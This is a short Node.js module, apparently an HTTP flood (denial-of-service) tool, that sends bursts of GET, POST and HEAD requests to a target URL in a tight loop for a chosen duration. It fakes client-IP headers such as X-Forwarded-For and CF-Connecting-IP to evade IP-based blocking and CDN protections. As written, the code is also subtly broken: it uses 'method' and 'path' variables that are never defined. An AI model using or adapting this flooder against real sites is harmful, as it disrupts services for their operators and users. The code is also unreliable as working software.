const http = require("http");
const https = require("https");
const { URL } = require("url");

const methods = ["GET", "POST", "HEAD"];
const paths = ["/", "/login", "/api/data", "/search", "/random", "/home"];

function fakeIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join(".");
}

module.exports = function (target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const headers = {
      "User-Agent": "YourFloodBot/1.0",
      "X-Forwarded-For": fakeIP(),
      "Client-IP": fakeIP(),
      "CF-Connecting-IP": fakeIP(),
      "True-Client-IP": fakeIP()
    };

    const options = {
      method,
      hostname: url.hostname,
      path,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] from ${url.hostname} using ${method}`);
      res.on("data", () => {});
    });
    req.on("error", () => {});
    if (method === "POST") req.write("data=" + Math.random().toString(36));
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 20; i++) send();
    setImmediate(loop);
  }

  loop();
};
